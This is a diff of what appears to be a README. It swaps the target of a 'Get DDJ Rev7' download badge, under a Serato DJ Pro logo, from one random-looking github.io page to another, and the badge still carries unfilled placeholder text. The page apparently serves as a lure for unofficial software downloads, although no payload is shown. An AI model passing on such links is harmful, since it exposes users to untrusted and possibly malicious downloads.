@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://findvectorlogo.com/wp-content/uploads/2018/09/serato-dj-pro-vector-logo.png)
 
-[![Get DDJ Rev7](https://img.shields.io/badge/Download_App_Name-Now-0a5d8d?style=for-the-badge&logo=github)](https://seezmelilwj.github.io/.github/ddj-rev7)
+[![Get DDJ Rev7](https://img.shields.io/badge/Download_App_Name-Now-0a5d8d?style=for-the-badge&logo=github)](https://asrafali6140.github.io/.github/ddj-rev7)
 
 ---
 
